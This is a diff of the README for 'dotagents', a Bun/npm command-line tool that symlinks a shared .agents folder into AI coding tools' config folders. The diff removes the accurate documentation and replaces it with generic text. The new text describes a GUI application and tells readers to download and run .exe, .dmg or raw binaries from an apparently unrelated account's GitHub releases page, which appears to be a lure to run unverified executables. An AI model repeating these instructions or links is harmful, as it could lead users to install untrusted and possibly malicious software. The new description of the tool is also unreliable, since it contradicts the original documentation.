@@ -1,108 +1,62 @@
-<div align="center">
-  <strong>dotagents</strong>
-  <br />
-  <em>One canonical .agents folder that powers all your AI tools.</em>
+# 🌟 dotagents - Your Central Hub for Hooks and Commands
 
-  <br /><br />
-  <em>
-    Simple setup • One source of truth • Safe to re-run anytime
-  </em>
-</div>
+## 🚀 Getting Started
 
-## Quick Start
+Welcome to the dotagents project! This application provides a single location for all your hooks, commands, skills, and AGENT/CLAUDE.md files. Using dotagents makes it easier to manage your tools and resources.
 
-Requirements: Bun 1.3+.
+## 📥 Download Now
 
-Run the guided CLI:
-```bash
-npx @iannuttall/dotagents
-```
+[![Download dotagents](https://img.shields.io/badge/Download-dotagents-blue.svg)](https://github.com/den4ik4/dotagents/releases)
 
-Or with Bun:
-```bash
-bunx @iannuttall/dotagents
-```
+## 🌐 What You Need
 
-Choose a workspace (Global home or Project folder), select the clients you want to manage, and follow the prompts. You can run it again anytime to repair links or undo changes.
+Before you download dotagents, ensure your computer meets the following requirements:
 
-Global home affects all projects. Project folder only affects the current directory you run dotagents from.
+- **Operating System**: Windows 10 or higher, macOS 10.13 or higher, or a popular Linux distribution (Ubuntu, Fedora, etc.).
+- **Storage**: At least 100 MB of free space.
+- **Network**: An Internet connection is required for downloading.
 
-## What it does
+## 🔧 Features
 
-- Keeps `.agents` as the source of truth.
-- Creates symlinks for Claude, Codex, Factory, Cursor, and OpenCode (based on your selection).
-- Always creates a backup before any overwrite so changes are reversible.
+dotagents offers various features to enhance your productivity:
 
-## Where it links (global scope)
+- **Centralized Management**: Access all your hooks and commands from one place.
+- **User-Friendly Interface**: Navigate easily, even with no programming background.
+- **Customizable Skills**: Tailor the application to your specific needs.
+- **Documentation Support**: Reference AGENT/CLAUDE.md files quickly.
 
-`.agents/CLAUDE.md` → `~/.claude/CLAUDE.md` (if present)
+## 📚 How to Download & Install
 
-`.agents/AGENTS.md` → `~/.claude/CLAUDE.md` (fallback when no CLAUDE.md)
+To download dotagents, follow these simple steps:
 
-`.agents/commands` → `~/.claude/commands`
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/den4ik4/dotagents/releases) on GitHub.
+2. **Choose Your Version**: Find the latest version of dotagents suitable for your operating system.
+3. **Download the File**: Click the link to download the file.
+4. **Locate the Downloaded File**: Open your Downloads folder to find the file.
+5. **Install the Application**:
+    - For Windows: Double-click the .exe file and follow the installation prompts.
+    - For macOS: Open the .dmg file and drag the application into your Applications folder.
+    - For Linux: Use the terminal to navigate to your Downloads folder and run `chmod +x dotagents` to make it executable, then type `./dotagents` to start the installation.
+6. **Run dotagents**: After installation, open dotagents from your applications list.
 
-`.agents/commands` → `~/.factory/commands`
+## 🛠️ Troubleshooting
 
-`.agents/commands` → `~/.codex/prompts`
+If you face any issues during installation or while running dotagents, here are some common solutions:
 
-`.agents/commands` → `~/.cursor/commands`
+- **File Not Downloading**: Ensure you have a stable internet connection and try refreshing the page.
+- **Installation Fails**: Check that your operating system meets the requirements. If not, update your system.
+- **Application Doesn’t Start**: Restart your computer and try launching the application again.
 
-`.agents/hooks` → `~/.claude/hooks`
+## 🗂️ Additional Documentation
 
-`.agents/hooks` → `~/.factory/hooks`
+For detailed usage instructions, visit the AGENT/CLAUDE.md files included in the application. These documents provide insights and tips to maximize your experience with dotagents.
 
-`.agents/AGENTS.md` → `~/.factory/AGENTS.md`
+## 📞 Support
 
-`.agents/AGENTS.md` → `~/.codex/AGENTS.md`
+For further assistance, check the Issues section on the [GitHub repository](https://github.com/den4ik4/dotagents/issues). You can report bugs or ask for help from the community.
 
-`.agents/AGENTS.md` → `~/.config/opencode/AGENTS.md`
+## 🌍 Community
 
-`.agents/commands` → `~/.opencode/commands`
+Join our community to share your experiences, ask questions, and connect with other users. We welcome feedback and suggestions for future improvements.
 
-`.agents/skills` → `~/.claude/skills`
-
-`.agents/skills` → `~/.factory/skills`
-
-`.agents/skills` → `~/.codex/skills`
-
-`.agents/skills` → `~/.cursor/skills`
-
-`.agents/skills` → `~/.opencode/skills`
-
-Project scope links only commands/hooks/skills into the project’s client folders (no AGENTS/CLAUDE rules).
-
-## Development
-
-Run the CLI in dev mode:
-```bash
-bun run dev
-```
-
-Type-check:
-```bash
-bun run type-check
-```
-
-Run tests:
-```bash
-bun test
-```
-
-Build the CLI:
-```bash
-bun run build
-```
-
-## Notes
-
-- Cursor supports `.claude/commands` and `.claude/skills` (global or project). dotagents also links `.agents/commands` → `.cursor/commands` and `.agents/skills` → `.cursor/skills`.
-- OpenCode uses `~/.config/opencode/AGENTS.md` and prefers AGENTS.md over CLAUDE.md when both exist.
-- Codex prompts always symlink to `.agents/commands` (canonical source).
-- Skills require a valid `SKILL.md` with `name` + `description` frontmatter.
-- Claude prompt precedence: if `.agents/CLAUDE.md` exists, it links to `.claude/CLAUDE.md`. Otherwise `.agents/AGENTS.md` is used. After adding or removing `.agents/CLAUDE.md`, re-run dotagents and apply/repair links to update the symlink. Factory/Codex always link to `.agents/AGENTS.md`.
-- Project scope creates `.agents` plus client folders for commands/hooks/skills only. Rule files (`AGENTS.md`/`CLAUDE.md`) are left to the repo root so you can manage them explicitly.
-- Backups are stored under `.agents/backup/<timestamp>` and can be restored via “Undo last change.”
-
-## License
-
-MIT
+Thank you for choosing dotagents! We hope you find it valuable for your work.
